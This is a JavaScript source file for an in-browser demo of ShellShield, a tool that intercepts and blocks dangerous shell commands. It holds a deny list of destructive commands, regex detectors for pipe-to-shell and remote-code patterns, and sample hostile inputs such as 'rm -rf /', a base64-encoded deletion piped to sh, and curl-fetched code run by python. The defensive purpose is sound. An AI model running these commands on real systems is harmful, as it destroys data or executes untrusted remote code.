// An in-browser port of a subset of ShellShield's rules (github.com/hevlyo/ShellShield).
// Reasons and suggestions are the CLI's own strings, so blocked output matches the real tool.

import { $, h, escapeHtml, sleep } from '../core/util.js';
import { calm } from '../core/motion.js';
import { pick, onLang, lang } from '../core/i18n.js';

/* ---------- Rule data (from src/constants.ts and src/security/patterns.ts) ---------- */

const BLOCKED = new Set([
  'rm', 'shred', 'unlink', 'wipe', 'srm',
  'mkfs', 'mkfs.ext4', 'mkfs.xfs', 'mkfs.btrfs', 'mkfs.ntfs', 'mkfs.fat', 'mkfs.vfat',
  'fdisk', 'parted', 'gdisk', 'cfdisk', 'sfdisk', 'dd', 'wipefs', 'badblocks',
  'systemctl', 'init', 'shutdown', 'reboot', 'poweroff', 'halt',
  'iptables', 'ip6tables', 'nft', 'ufw',
  'su', 'doas', 'pkexec',
  'userdel', 'groupdel', 'passwd', 'chpasswd',
]);
const PREFIXES = new Set(['sudo', 'xargs', 'command', 'env']);
const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'fish', 'pwsh', 'powershell']);
const SYSTEMCTL_DESTRUCTIVE = new Set(['stop', 'disable', 'mask', 'reboot', 'poweroff', 'halt', 'suspend', 'hibernate', 'hybrid-sleep', 'emergency', 'rescue', 'daemon-reload', 'daemon-reexec', 'enable', 'reenable', 'preset', 'preset-all']);
const CRITICAL_PATHS = new Set(['/', '/etc', '/usr', '/var', '/bin', '/sbin', '/lib', '/boot', '/root', '/dev', '/proc', '/sys', 'c:/windows', 'c:/windows/system32', 'c:/program files', 'c:/users']);
const TRUSTED_DOMAINS = ['github.com', 'raw.githubusercontent.com', 'get.docker.com', 'sh.rustup.rs', 'bun.sh', 'install.python-poetry.org', 'raw.github.com'];
const SENSITIVE = [/\/\.ssh\//, /\/\.bashrc$/, /\/\.zshrc$/, /\/\.profile$/, /\/\.gitconfig$/];

const RAW_RULES = [
  { re: /\beval\b\s{0,10}["']?(?:\$\(|`)\s{0,10}(?:curl|wget)\b/i, reason: 'EVAL-PIPE-TO-SHELL DETECTED', suggestion: 'Avoid eval with remote content. Download and review the script first.' },
  { re: /\b(?:sh|bash|zsh|dash|python\d*(?:\.\d+)*|perl|ruby|node|bun|php\d*)\s{0,10}-(?:c|e)\s{0,10}["']?(?:\$\(|`)\s{0,10}(?:curl|wget)\b/i, reason: 'COMMAND SUBSTITUTION DETECTED', suggestion: 'Executing remote scripts via command substitution is dangerous.' },
  { re: /base64\s{0,10}-d\s{0,10}\|\s{0,10}(?:sh|bash|zsh)\b/i, reason: 'ENCODED PIPE-TO-SHELL DETECTED', suggestion: 'Decoding remote content and piping to a shell is dangerous.' },
  { re: /xxd\s{0,10}-r\s{0,10}-p\s{0,10}\|\s{0,10}(?:sh|bash|zsh)\b/i, reason: 'ENCODED PIPE-TO-SHELL DETECTED', suggestion: 'Decoding remote content and piping to a shell is dangerous.' },
  { re: /\b(?:curl|wget)\b[^|]{0,1000}?\|\s{0,10}(?:python\d*|perl|ruby|node|php|deno)\b/i, reason: 'PIPE-TO-INTERPRETER DETECTED', suggestion: 'Piping remote content to an interpreter is dangerous. Download and review first.' },
  { re: /<\(\s{0,10}(?:curl|wget)\b/i, reason: 'PROCESS SUBSTITUTION DETECTED', suggestion: 'Process substitution with remote content is dangerous.' },
];

const CONFUSABLE = /[\u0370-\u03ff\u0400-\u052f\u0530-\u058f\u13a0-\u13ff\u2100-\u214f\uff00-\uffef]/;
const CHAR_NAMES = {
  '\u0456': 'CYRILLIC SMALL LETTER BYELORUSSIAN-UKRAINIAN I',
  '\u0430': 'CYRILLIC SMALL LETTER A',
  '\u0435': 'CYRILLIC SMALL LETTER IE',
  '\u043e': 'CYRILLIC SMALL LETTER O',
  '\u0440': 'CYRILLIC SMALL LETTER ER',
  '\u0441': 'CYRILLIC SMALL LETTER ES',
  '\u0445': 'CYRILLIC SMALL LETTER HA',
  '\u03bf': 'GREEK SMALL LETTER OMICRON',
  '\u03b1': 'GREEK SMALL LETTER ALPHA',
};
const HIDDEN = /[\u200b-\u200d\ufeff\u2060\u00ad]/;

/* ---------- Parsing ---------- */

/** Splits on ; && || | & and newlines, respecting quotes. */
function splitCommands(command) {
  const parts = [];
  let current = '';
  let quote = null;
  for (let i = 0; i < command.length; i++) {
    const c = command[i];
    if (quote) {
      current += c;
      if (c === quote && command[i - 1] !== '\\') quote = null;
    } else if (c === '"' || c === "'") {
      quote = c;
      current += c;
    } else if (c === ';' || c === '\n') {
      parts.push(current);
      current = '';
    } else if (c === '&' || c === '|') {
      if (command[i + 1] === c) i++;
      parts.push(current);
      current = '';
    } else {
      current += c;
    }
  }
  parts.push(current);
  return parts.map((part) => part.trim()).filter(Boolean);
}

function words(segment) {
  const out = [];
  let current = '';
  let quote = null;
  let started = false;
  for (const c of segment) {
    if (quote) {
      if (c === quote) quote = null;
      else current += c;
    } else if (c === '"' || c === "'") {
      quote = c;
      started = true;
    } else if (/\s/.test(c)) {
      if (current || started) out.push(current);
      current = '';
      started = false;
    } else {
      current += c;
    }
  }
  if (current || started) out.push(current);
  return out;
}

function isCriticalPath(path) {
  let normalized = path.toLowerCase().replace(/\\/g, '/');
  if (/^\/\*+$/.test(normalized)) return true;
  normalized = normalized.replace(/\/+$/, '');
  if (!normalized || normalized === '/' || /^[a-z]:$/.test(normalized)) return true;
  return CRITICAL_PATHS.has(normalized);
}

function hostOf(token) {
  return token.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '').replace(/^[^@/]*@/, '').split(/[/?#:]/)[0];
}

/* ---------- Analysis ---------- */

const block = (reason, suggestion, extra = {}) => ({ blocked: true, reason, suggestion, ...extra });

function checkBlockedCommand(cmd, args) {
  if (cmd === 'dd') {
    return args.some((arg) => arg.toLowerCase().startsWith('of=')) ? block('Destructive dd detected', 'be careful with dd of=') : null;
  }
  if (cmd === 'mv' || cmd === 'cp') {
    for (const arg of args) if (!arg.startsWith('-') && isCriticalPath(arg)) return block('CRITICAL PATH TARGETED', `Modifying critical system path ${arg} is prohibited.`);
  }
  if (cmd === 'chmod' || cmd === 'chown' || cmd === 'chgrp') {
    const recursive = args.some((arg) => arg === '-R' || arg === '--recursive' || (/^-[^-]/.test(arg) && arg.includes('R')));
    if (recursive) {
      for (const arg of args) if (!arg.startsWith('-') && isCriticalPath(arg)) return block('CRITICAL PATH TARGETED', `Recursive ${cmd} on critical system path ${arg} is prohibited.`);
    }
  }
  if (cmd === 'systemctl') {
    const sub = args.find((arg) => !arg.startsWith('-'));
    return sub && SYSTEMCTL_DESTRUCTIVE.has(sub.toLowerCase())
      ? block(`Destructive systemctl ${sub} detected`, `systemctl ${sub} can disrupt system services. Review before running.`)
      : null;
  }
  if (!BLOCKED.has(cmd)) return null;
  for (const arg of args) if (!arg.startsWith('-') && isCriticalPath(arg)) return block('CRITICAL PATH PROTECTED', `Permanent deletion of ${arg} is prohibited.`);
  const files = args.filter((arg) => !arg.startsWith('-'));
  if (files.length > 50) return block('VOLUME THRESHOLD EXCEEDED', `You are trying to delete ${files.length} files. Use a more specific command.`);
  return block(`Destructive command '${cmd}' detected`, cmd === 'rm' && files.length ? `trash ${files.join(' ')}` : 'trash <files>');
}

function analyzeSegment(segment, depth) {
  let tokens = words(segment);
  const args = [];
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i];
    const redirect = token.match(/^\d?(>>?|<)(.*)$/);
    if (redirect) {
      const target = redirect[2] || tokens[++i] || '';
      const expanded = target.replace(/^~(?=\/|$)/, '/home/user');
      if (redirect[1] !== '<' && (SENSITIVE.some((re) => re.test(expanded)) || /^\/etc\//.test(expanded))) {
        return block('SENSITIVE PATH TARGETED', `Command is attempting to write directly to a critical configuration file: ${target}`);
      }
      continue;
    }
    args.push(token);
  }
  tokens = args;

  // Strip environment assignments and wrappers (sudo, env, command, xargs) like the real parser does.
  for (;;) {
    while (tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[0])) tokens = tokens.slice(1);
    if (!tokens.length) return null;
    const head = tokens[0].split('/').pop();
    if (!PREFIXES.has(head)) break;
    tokens = tokens.slice(1);
    while (tokens.length && tokens[0].startsWith('-')) tokens = tokens.slice(tokens[0] === '-u' ? 2 : 1);
  }

  const cmd = tokens[0].split('/').pop();
  const rest = tokens.slice(1);

  if (SHELLS.has(cmd)) {
    const flag = rest.findIndex((arg) => /^-[a-z]*c[a-z]*$/i.test(arg));
    if (flag >= 0 && rest[flag + 1] != null) {
      if (depth >= 5) return block('SUBSHELL DEPTH LIMIT EXCEEDED', 'Nested shells go deeper than the analysis limit. Review the full command before running.');
      return analyze(rest[flag + 1], depth + 1);
    }
  }
  if (cmd === 'git' && rest[0] === 'rm') return checkBlockedCommand('rm', rest.slice(1));
  if (cmd === 'find') {
    if (rest.includes('-delete')) return block('find -delete detected', 'trash <files>');
    const exec = rest.findIndex((arg) => arg === '-exec' || arg === '-execdir' || arg === '-ok');
    const target = exec >= 0 ? rest[exec + 1]?.split('/').pop() : null;
    if (target && BLOCKED.has(target)) return block(`find ${rest[exec]} ${target} detected${rest[exec] === '-ok' ? ' - dangerous command' : ''}`, 'trash <files>');
  }
  return checkBlockedCommand(cmd, rest);
}

/** Returns { blocked, reason, suggestion, mark? } or { blocked: false, note? }. */
function analyze(command, depth = 0) {
  if (command.length > 10000) return block('COMMAND TOO LONG', 'The command exceeds the analysis limit. Inspect manually or simplify.');

  if (/\x1b[[\]]|\x9b/.test(command)) {
    return block('TERMINAL INJECTION DETECTED', 'Command contains ANSI escape sequences or hidden characters that can manipulate terminal output.');
  }
  const hidden = command.match(HIDDEN);
  if (hidden) {
    return block('HIDDEN CHARACTERS DETECTED', 'Command contains ANSI escape sequences or hidden characters that can manipulate terminal output.', { mark: hidden[0] });
  }

  const urls = command.match(/[a-z][a-z0-9+.-]*:\/\/[^\s"'`|]+/gi) || [];
  const bare = command.split(/\s+/).filter((token) => token.includes('.') && !token.includes('://'));
  for (const token of [...urls, ...bare]) {
    const char = hostOf(token).match(CONFUSABLE)?.[0];
    if (char) {
      return block('HOMOGRAPH ATTACK DETECTED', `Suspicious character found: ${char}. This may be a visually similar domain masking a malicious source.`, { mark: char });
    }
  }

  const subshells = command.match(/\b(?:sh|bash|zsh|dash|fish|pwsh|powershell)\b\s{0,10}-c\b/gi) || [];
  if (subshells.length >= 4 && /\b(?:rm|shred|unlink|wipe|srm|dd)\b/i.test(command)) {
    return block('DEEP SUBSHELL DETECTED', 'Nested shells can conceal destructive commands. Review the full command before running.');
  }
  for (const rule of RAW_RULES) if (rule.re.test(command)) return block(rule.reason, rule.suggestion);

  if (/[a-z][a-z0-9+.-]{1,20}:\/\/[^\s/@:'"]{1,100}:[^\s/@'"]{1,200}@/i.test(command)) {
    return block('CREDENTIAL EXPOSURE DETECTED', 'Commands should not include credentials in URLs. Use environment variables or netrc.');
  }

  let note = null;
  const pipe = command.match(/\b(curl|wget)\b([^|]{0,1000})\|\s{0,10}(?:sudo\s+(?:-\S+\s+)*)?(sh|bash|zsh|dash|fish|ksh)\b/i);
  if (pipe) {
    const flags = pipe[2];
    const url = flags.match(/[a-z]+:\/\/[^\s"'|]+/i)?.[0] || '';
    if (/(?:^|\s)(?:-k|--insecure|--no-check-certificate)\b/.test(flags)) {
      return block('INSECURE TRANSPORT DETECTED', 'Piping to a shell with certificate validation disabled is extremely dangerous.');
    }
    if (/^http:\/\//i.test(url)) return block('INSECURE TRANSPORT DETECTED', 'Piping plain HTTP content to a shell is dangerous. Use HTTPS.');
    const host = hostOf(url).toLowerCase();
    const trusted = url && TRUSTED_DOMAINS.some((domain) => host === domain || host.endsWith(`.${domain}`));
    if (!trusted) return block('PIPE-TO-SHELL DETECTED', 'Executing remote scripts directly via pipe is dangerous. Download and review the script first.');
    note = { trusted: host };
  }

  for (const segment of splitCommands(command)) {
    const result = analyzeSegment(segment, depth);
    if (result) return result;
  }
  return { blocked: false, note };
}

/** Runs the analysis repeatedly for ~4 ms to get a meaningful per-command time despite coarse timers. */
function benchmark(command) {
  const start = performance.now();
  let runs = 0;
  let result;
  do {
    result = analyze(command);
    runs++;
  } while (performance.now() - start < 4 && runs < 20000);
  return { result, micros: ((performance.now() - start) * 1000) / runs, runs };
}

/* ---------- Fake shell for allowed commands ---------- */

const TEXT = {
  title: ['zsh · ~/projeto', 'zsh · ~/project'],
  badge: ['protegido', 'protected'],
  placeholder: ['comando…', 'command…'],
  run: ['executar', 'run'],
  intro: [
    ['ShellShield 1.1.0 · demo no navegador', 'Subconjunto das regras do CLI, com as mesmas mensagens.', 'Nada é executado aqui. Digite um comando ou toque em um exemplo.'],
    ['ShellShield 1.1.0 · in-browser demo', 'A subset of the CLI’s rules, with the same messages.', 'Nothing actually runs. Type a command or tap an example.'],
  ],
  allowed: ['permitido', 'allowed'],
  timing: ['analisado em {t} µs (média de {n} execuções no seu navegador)', 'analyzed in {t} µs (average of {n} runs in your browser)'],
  trusted: ['domínio confiável ({host}), liberado pela allowlist', 'trusted domain ({host}), allowed by the allowlist'],
  demo: ['(demo) permitido. Nada é executado aqui.', '(demo) allowed. Nothing runs here.'],
  trashed: ['{f} → lixeira (recuperável)', '{f} → trash (recoverable)'],
  installed: ['(demo) nada foi instalado, mas o ShellShield deixaria passar.', '(demo) nothing was installed, but ShellShield would let it through.'],
  examples: ['exemplos', 'examples'],
  homograph: ['↳ {c} é {code} {name}, não a letra latina.', '↳ {c} is {code} {name}, not the Latin letter.'],
  hidden: ['↳ caractere invisível {code} escondido no comando.', '↳ invisible character {code} hidden in the command.'],
  help: [
    'Tente: rm -rf /  ·  curl … | bash  ·  sh -c "rm -rf /etc"  ·  trash <arquivo>  ·  clear',
    'Try: rm -rf /  ·  curl … | bash  ·  sh -c "rm -rf /etc"  ·  trash <file>  ·  clear',
  ],
};

const EXAMPLES = [
  { cmd: 'rm -rf /', kind: 'danger' },
  { cmd: 'curl -fsSL https://\u0456nstall.sh | bash', kind: 'danger' },
  { cmd: 'echo cm0gLXJmIH4= | base64 -d | sh', kind: 'danger' },
  { cmd: 'sudo sh -c "rm -rf /etc"', kind: 'danger' },
  { cmd: 'python3 -c "$(curl -s https://paste.example/x.py)"', kind: 'danger' },
  { cmd: 'git clone https://admin:hunter2@git.example.com/app.git', kind: 'danger' },
  { cmd: 'rm -rf node_modules', kind: 'danger' },
  { cmd: 'curl -fsSL https://bun.sh/install | bash', kind: 'safe' },
  { cmd: 'git status', kind: 'safe' },
];

const fill = (text, vars) => text.replace(/\{(\w+)\}/g, (_, key) => vars[key] ?? '');

function fakeOutput(command) {
  const [cmd, ...args] = words(command.trim());
  const visitor = pick(['visitante', 'visitor']);
  switch (cmd) {
    case 'ls':
      return args.some((a) => a.startsWith('-') && a.includes('l'))
        ? 'drwxr-xr-x  src/\ndrwxr-xr-x  tests/\ndrwxr-xr-x  node_modules/\n-rw-r--r--  package.json\n-rw-r--r--  README.md'
        : 'README.md  package.json  src/  tests/  node_modules/';
    case 'pwd':
      return `/home/${visitor}/${pick(['projeto', 'project'])}`;
    case 'whoami':
      return visitor;
    case 'echo':
      return args.join(' ');
    case 'date':
      return new Date().toString();
    case 'cat':
      return args[0] === 'README.md' ? '# 🛡️ ShellShield\nReal-time terminal guard for the AI era.' : `cat: ${args[0] ?? ''}: ${pick(['arquivo de mentira', 'pretend file'])}`;
    case 'git':
      if (args[0] === 'status') return "On branch main\nYour branch is up to date with 'origin/main'.\n\nnothing to commit, working tree clean";
      if (args[0] === 'log') return 'a1c9e2f feat: block homograph attacks\n7d03b4e perf: 23.5µs per command\n3f88a10 test: 117 bypass cases';
      return pick(TEXT.demo);
    case 'trash':
      return args.length ? fill(pick(TEXT.trashed), { f: args.join(' ') }) : 'usage: trash <files>';
    case 'shellshield':
      if (args.includes('--version') || args.includes('-v')) return 'ShellShield 1.1.0';
      return 'usage: shellshield <init|check|doctor|stats|why|mode|score|receipt|run|snapshot>';
    case 'npm':
    case 'pnpm':
    case 'bun':
    case 'yarn':
      return pick(TEXT.installed);
    case 'help':
    case 'ajuda':
      return pick(TEXT.help);
    default:
      return pick(TEXT.demo);
  }
}

/* ---------- UI ---------- */

function markCommand(command, mark) {
  const visible = (char) => (HIDDEN.test(char) ? `[U+${char.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}]` : char);
  if (!mark) return escapeHtml(command);
  return [...command].map((char) => (char === mark ? `<span class="t-mark">${escapeHtml(visible(char))}</span>` : escapeHtml(char))).join('');
}

const codepoint = (char) => `U+${char.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}`;

export function mount(host) {
  host.textContent = '';
  host.classList.add('term');

  const title = h('span', { class: 'win-title' });
  const badge = h('span', { class: 'win-badge' });
  const body = h('div', { class: 'term-body', role: 'log', 'aria-live': 'polite', tabindex: '0' });
  const input = h('input', { class: 'term-input', type: 'text', autocomplete: 'off', autocapitalize: 'off', spellcheck: 'false', enterkeyhint: 'send' });
  const runButton = h('button', { class: 'term-run', type: 'submit' });
  const form = h('form', { class: 'term-form' }, h('span', { class: 't-prompt', 'aria-hidden': 'true' }, '❯'), input, runButton);
  const chips = h('div', { class: 'term-chips', role: 'group' });

  host.append(
    h('div', { class: 'win-bar' }, h('span', { class: 'win-dots', 'aria-hidden': 'true' }, h('i'), h('i'), h('i')), title, badge),
    body,
    form,
    chips,
  );

  const history = [];
  let cursor = 0;
  let introBlock = null;
  let typing = false;

  function syncText() {
    title.textContent = pick(TEXT.title);
    badge.textContent = pick(TEXT.badge);
    input.placeholder = pick(TEXT.placeholder);
    input.setAttribute('aria-label', pick(['Comando para o ShellShield analisar', 'Command for ShellShield to analyze']));
    body.setAttribute('aria-label', pick(['Saída do terminal', 'Terminal output']));
    runButton.textContent = pick(TEXT.run);
    chips.setAttribute('aria-label', pick(TEXT.examples));
    if (introBlock) {
      introBlock.replaceWith((introBlock = renderIntro()));
    }
  }

  function renderIntro() {
    const [first, ...rest] = pick(TEXT.intro);
    return h('div', { class: 'term-entry' }, h('p', { class: 'term-line t-bold' }, first), ...rest.map((line) => h('p', { class: 'term-line t-dim' }, line)));
  }

  function scrollDown() {
    body.scrollTop = body.scrollHeight;
  }

  function run(command) {
    const trimmed = command.trim();
    if (!trimmed) return;
    history.push(command);
    cursor = history.length;

    if (trimmed === 'clear' || trimmed === 'cls') {
      body.textContent = '';
      introBlock = null;
      return;
    }

    const { result, micros, runs } = benchmark(command);
    const locale = lang() === 'en' ? 'en-US' : 'pt-BR';
    const timing = fill(pick(TEXT.timing), {
      t: micros.toLocaleString(locale, { maximumFractionDigits: micros < 10 ? 2 : 1 }),
      n: runs.toLocaleString(locale),
    });

    const entry = h('div', { class: 'term-entry' });
    entry.append(h('p', { class: 'term-line term-cmd', html: `<span class="t-prompt">❯</span>${markCommand(command, result.mark)}` }));

    if (result.blocked) {
      const suggestion = escapeHtml(result.suggestion).replace(/(\/[^\s"'&]+|[A-Za-z]:\\[^\s"'&]+)/g, '<span class="t-cyan">$1</span>');
      const rule = '━'.repeat(60);
      entry.append(
        h('p', { class: 'term-line', html: `<span class="t-red">🛡️ </span>ShellShield <span class="t-red t-bold">BLOCKED</span>: ${escapeHtml(result.reason)}` }),
        h('p', { class: 'term-line t-rule', 'aria-hidden': 'true' }, rule),
        h('p', { class: 'term-line', html: `<span class="t-yellow t-bold">ACTION REQUIRED:</span> ${suggestion}` }),
        h('p', { class: 'term-line t-rule', 'aria-hidden': 'true' }, rule),
        h('p', { class: 'term-line t-dim' }, 'Bypass: SHELLSHIELD_SKIP=1 <command>  (or: true, yes, on, enable, enabled)'),
        h('p', { class: 'term-line t-dim' }, 'ShellShield - Keeping your terminal safe.'),
      );
      if (result.mark && result.reason.startsWith('HOMOGRAPH')) {
        entry.append(h('p', { class: 'term-line t-fg2' }, fill(pick(TEXT.homograph), { c: result.mark, code: codepoint(result.mark), name: CHAR_NAMES[result.mark] || '' })));
      } else if (result.mark) {
        entry.append(h('p', { class: 'term-line t-fg2' }, fill(pick(TEXT.hidden), { code: codepoint(result.mark) })));
      }
    } else {
      entry.append(h('p', { class: 'term-line', html: `<span class="t-green">✓ ShellShield: ${escapeHtml(pick(TEXT.allowed).toUpperCase())}</span>` }));
      if (result.note?.trusted) entry.append(h('p', { class: 'term-line t-fg2' }, fill(pick(TEXT.trusted), { host: result.note.trusted })));
      entry.append(h('p', { class: 'term-line t-fg2' }, result.note?.trusted ? pick(TEXT.demo) : fakeOutput(command)));
    }
    entry.append(h('p', { class: 'term-line t-dim' }, timing));
    body.append(entry);
    scrollDown();
  }

  async function typeAndRun(command) {
    if (typing) return;
    typing = true;
    input.value = '';
    if (!calm()) {
      for (const char of command) {
        input.value += char;
        await sleep(command.length > 40 ? 9 : 16);
      }
      await sleep(120);
    }
    input.value = '';
    run(command);
    typing = false;
  }

  form.addEventListener('submit', (event) => {
    event.preventDefault();
    if (typing) return;
    const command = input.value;
    input.value = '';
    run(command);
  });
  input.addEventListener('keydown', (event) => {
    if (event.key === 'ArrowUp' && history.length) {
      event.preventDefault();
      cursor = Math.max(0, cursor - 1);
      input.value = history[cursor];
    } else if (event.key === 'ArrowDown' && history.length) {
      event.preventDefault();
      cursor = Math.min(history.length, cursor + 1);
      input.value = history[cursor] ?? '';
    } else if (event.key.toLowerCase() === 'l' && event.ctrlKey) {
      event.preventDefault();
      run('clear');
    }
  });
  body.addEventListener('click', () => {
    if (!getSelection()?.toString()) input.focus({ preventScroll: true });
  });

  for (const example of EXAMPLES) {
    chips.append(
      h('button', { class: 'term-chip', type: 'button', 'data-kind': example.kind, onclick: () => typeAndRun(example.cmd) }, example.cmd),
    );
  }

  introBlock = renderIntro();
  body.append(introBlock);
  syncText();
  onLang(syncText);
}

export { analyze };
